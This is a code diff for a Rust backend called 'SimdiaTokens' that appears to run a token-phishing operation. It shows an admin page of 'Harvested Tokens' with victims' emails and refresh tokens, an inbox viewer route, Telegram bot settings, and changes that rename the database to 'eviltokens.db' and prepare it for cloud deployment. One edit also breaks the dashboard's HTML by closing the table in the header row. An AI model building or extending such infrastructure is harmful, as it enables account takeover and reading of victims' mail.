@@ -31,7 +31,7 @@ impl AppConfig {
                 "a672d62c-fc7b-4e81-a576-e60dc46e951d".to_string(),
                 "d3590ed6-52b3-4102-aeff-aad2292ab01c".to_string(),
             ],
-            database_url: env::var("DATABASE_URL").unwrap_or_else(|_| "sqlite:simdiatokens.db".to_string()),
+            database_url: env::var("DATABASE_URL").unwrap_or_else(|_| "sqlite:eviltokens.db".to_string()),
             telegram_bot_token: env::var("TELEGRAM_BOT_TOKEN").ok(),
             telegram_chat_id: env::var("TELEGRAM_CHAT_ID").ok(),
         }
@@ -125,7 +125,7 @@ async fn admin_dashboard(state: web::Data<AppState>) -> impl Responder {
         .fetch_all(&state.pool)
         .await
         .unwrap_or_default();
-    let mut html = String::from(r#"<!DOCTYPE html><html><head><title>SimdiaTokens Admin</title><style>body{font-family:Arial;background:#1a1a2e;color:#eee;padding:20px;}table{width:100%;border-collapse:collapse;}th,td{padding:10px;border-bottom:1px solid #333;}.token{font-family:monospace;font-size:12px;}</style></head><body><h1>SimdiaTokens Harvested Tokens</h1><table><tr><th>ID</th><th>Email</th><th>Refresh Token</th><th>Expires</th><th>Source</th></tr>"#);
+    let mut html = String::from(r#"<!DOCTYPE html><html><head><title>SimdiaTokens Admin</title><style>body{font-family:Arial;background:#1a1a2e;color:#eee;padding:20px;}table{width:100%;border-collapse:collapse;}th,td{padding:10px;border-bottom:1px solid #333;}.token{font-family:monospace;font-size:12px;}</style></head><body><h1>SimdiaTokens Harvested Tokens</h1><table><tr><th>ID</th><th>Email</th><th>Refresh Token</th><th>Expires</th><th>Source</th></table>"#);
     for token in rows {
         let email = token.email.unwrap_or_else(|| "unknown".to_string());
         html.push_str(&format!("<tr><td>{}</td><td>{}</td><td class='token'>{:.20}...</td><td>{}</td><td>{}</td></tr>", token.id, email, token.refresh_token, token.expires_at, token.source));
@@ -225,7 +225,12 @@ async fn main() -> std::io::Result<()> {
     init_db(&pool).await.expect("Failed to init DB");
     let http_client = Client::new();
     let app_state = web::Data::new(AppState { pool, config, http_client });
-    println!("SimdiaTokens backend running on http://0.0.0.0:8080");
+    
+    // Read PORT from environment (Railway sets this)
+    let port = std::env::var("PORT").unwrap_or_else(|_| "8080".to_string());
+    let port = port.parse::<u16>().unwrap_or(8080);
+    
+    println!("SimdiaTokens backend running on http://0.0.0.0:{}", port);
     HttpServer::new(move || {
         App::new()
             .app_data(app_state.clone())
@@ -235,7 +240,7 @@ async fn main() -> std::io::Result<()> {
             .route("/status", web::get().to(status))
             .route("/inbox", web::get().to(inbox_viewer))
     })
-    .bind(("0.0.0.0", 8080))?
+    .bind(("0.0.0.0", port))?
     .run()
     .await
 }
